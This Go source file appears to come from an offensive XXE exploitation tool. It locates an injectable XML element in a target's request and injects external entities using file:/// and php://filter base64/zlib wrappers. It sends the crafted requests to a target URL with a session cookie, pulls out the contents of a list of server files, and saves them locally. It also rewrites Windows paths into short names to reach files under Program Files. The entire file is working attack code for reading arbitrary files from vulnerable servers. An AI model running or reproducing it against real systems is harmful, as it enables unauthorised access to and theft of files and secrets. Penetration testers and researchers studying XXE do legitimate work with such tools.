package xxe

import (
	"bytes"
	"encoding/xml"
	"fmt"
	"io/ioutil"
	"math"
	"regexp"

	fp "path/filepath"
	str "strings"
)

// todo: try entities from /usr/share/seclists/Fuzzing/XXE-Fuzzing.txt
// todo: add hacktricks/pentesting-web/xxe-xee-xml-external-entity.md
// todo: try using cdata to allow downloading files with spaces:
//       https://www.invicti.com/learn/xml-external-entity-xxe/

func (p *ParamsT) DirectTest() error {
	defer p.LogFd.Close()

	fmtStr := make(map[string]string)
	fmtStr["file"] = `<!DOCTYPE root [<!ENTITY ext SYSTEM "file:///%s"> ]>`
	fmtStr["filter"] = `<!DOCTYPE root [<!ENTITY ext SYSTEM "php://filter/zlib.deflate/convert.base64-encode/resource=%s"> ]>`

	leafName, err := p.DirectDetectLeaf(fmtStr)
	if err != nil {
		return err
	}

	if leafName == "" {
		fmt.Fprintf(p.LogFd, "+ can't find direct XXE injection\n")
		return fmt.Errorf("can't find direct XXE injection")
	}

	msg := "+ enumerating all files with leaf: <%s>\n\n"
	fmt.Fprintf(p.LogFd, msg, leafName)

	for _, file := range p.Files {
		fileEncFilter := fileEncodeForFilter(file)
		entity := fmt.Sprintf(fmtStr["filter"], fileEncFilter)
		reqXml := str.Replace(p.XmlData, "?>", "?>"+entity, 1)

		msg := "+ trying php://filter with %s:\n%s\n"
		fmt.Fprintf(p.LogFd, msg, file, reqXml)

		// try php://filter first
		content, err := p.getFile(reqXml, leafName)
		if err != nil {
			return err
		}

		// dump the file and go to the next one if successful...
		if content != "" {
			locFile := makeLocalPath(p.OutDir, file)

			contentBin, err := defilter(content)
			if err != nil {
				locFile += ".zip"
			}

			msg := "+ success with php://filter and %s. "
			msg += "saving to: %s\n\n"
			fmt.Fprintf(p.LogFd, msg, file, locFile)

			err = ioutil.WriteFile(locFile, contentBin, 0640)
			if err != nil {
				return err
			}

			continue
		}

		// ... or try file:/// if php://filter doesn't work
		fileEncFile := str.Replace(file, " ", "%20", -1)

		entity = fmt.Sprintf(fmtStr["file"], fileEncFile)
		reqXml = str.Replace(p.XmlData, "?>", "?>"+entity, 1)

		content, err = p.getFile(reqXml, leafName)
		if err != nil {
			return err
		}

		// dump the file if successful
		if content != "" {
			locFile := makeLocalPath(p.OutDir, file)

			msg := "+ success with file:/// and %s. "
			msg += "saving to: %s\n\n"
			fmt.Fprintf(p.LogFd, msg, file, locFile)

			err = ioutil.WriteFile(locFile, []byte(content), 0640)
			if err != nil {
				return err
			}
		}
	}

	return nil
}

func (p *ParamsT) DirectDetectLeaf(fmtStr map[string]string) (string, error) {
	msg := "+ detecting exploitable leaf for direct XXE in:\n%s\n"
	fmt.Fprintf(p.LogFd, msg, p.XmlData)
	var n NodeT
	err := p.XmlDecoder.Decode(&n)
	if err != nil {
		return "", err
	}

	var leafs []LeafT
	walkNodes([]NodeT{n}, func(n NodeT) bool {
		decTest := xml.NewDecoder(bytes.NewBuffer(n.Content))
		var nTest NodeT
		err = decTest.Decode(&nTest)
		if err != nil {
			leaf := LeafT{Name: n.XMLName.Local,
				Value: string(n.Content)}
			leafs = append(leafs, leaf)
		}

		return true
	})

	fmt.Fprintf(p.LogFd, "+ detected leafs: %+v\n\n", leafs)

	for _, file := range p.Files {
		fileEncFilter := fileEncodeForFilter(file)
		entityFilter := fmt.Sprintf(fmtStr["filter"], fileEncFilter)

		fileEncFile := str.Replace(file, " ", "%20", -1)
		entityFile := fmt.Sprintf(fmtStr["file"], fileEncFile)

		xmlFilter := str.Replace(p.XmlData, "?>", "?>"+entityFilter, 1)
		xmlFile := str.Replace(p.XmlData, "?>", "?>"+entityFile, 1)

		for _, leaf := range leafs {
			msg := "+ trying php://filter on %s:\n%s\n"
			fmt.Fprintf(p.LogFd, msg, "<"+leaf.Name+">", xmlFilter)

			content, err := p.getFile(xmlFilter, leaf.Name)
			if err != nil {
				return "", err
			}

			if content != "" {
				msg := "+ success with php://filter on %s\n"
				fmt.Fprintf(p.LogFd, msg, "<"+leaf.Name+">")
				return leaf.Name, nil
			}

			msg = "+ trying file:/// on %s:\n%s\n"
			fmt.Fprintf(p.LogFd, msg, "<"+leaf.Name+">", xmlFile)

			content, err = p.getFile(xmlFile, leaf.Name)
			if err != nil {
				return "", err
			}

			if content != "" {
				msg := "+ success with file:/// on %s\n"
				fmt.Fprintf(p.LogFd, msg, "<"+leaf.Name+">")
				return leaf.Name, nil
			}
		}
	}

	return "", nil
}

func fileEncodeForFilter(file string) string {
	file = fp.Clean(file)
	if str.HasPrefix(file, "c:") {
		fileEncFilter := str.Replace(file,
			"/program files/", "progra~1", -1)
		fileEncFilter = str.Replace(fileEncFilter,
			"/program files (x86)/", "progra~2", -1)
		fields := str.Split(file, "/")
		for i, el := range fields {
			if str.Contains(el, " ") {
				lastChar := int(math.Min(6, float64(len(el))))
				fields[i] = el[:lastChar] + "~1"
			}
		}
		file = str.Join(fields, "/")
	}

	return file
}

func (p *ParamsT) getFile(reqXml, leafName string) (string, error) {
	exp := fmt.Sprintf("(<%s>).*(</%s>)", leafName, leafName)
	re := regexp.MustCompile(exp)

	sep := str.Repeat("-=x=", 15) + "-"
	replStr := fmt.Sprintf("${1}\n%s&ext;%s\n${2}", sep, sep)
	reqXmlMod := re.ReplaceAllString(reqXml, replStr)

	body, err := makeRequest(p.Url, reqXmlMod, p.Cookie, p.OutDir)
	if err != nil {
		return "", err
	}
	if str.Contains(body, sep) {
		bodyFields := str.Split(body, sep)
		return bodyFields[1], nil
	}
	return "", nil
}
